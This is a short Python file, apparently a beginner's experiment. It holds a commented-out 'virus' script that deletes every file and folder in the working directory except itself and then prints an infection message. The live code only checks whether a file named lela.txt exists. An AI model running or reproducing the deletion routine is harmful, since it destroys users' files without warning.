'''
import os

files = []

folders = []

for file in os.listdir():
    if file != "virus.py":
        if os.path.isfile(file):
            files.append(file)
        else:
            folders.append(file)
    else:
        pass

for i in files:
    os.remove(i)
for j in folders:
    os.removedirs(j)

print('your system is infected by gtst virus!! suuuu')
'''
import os
if os.path.exists("lela.txt"):
    print("already exists")
else:
    print("not found")
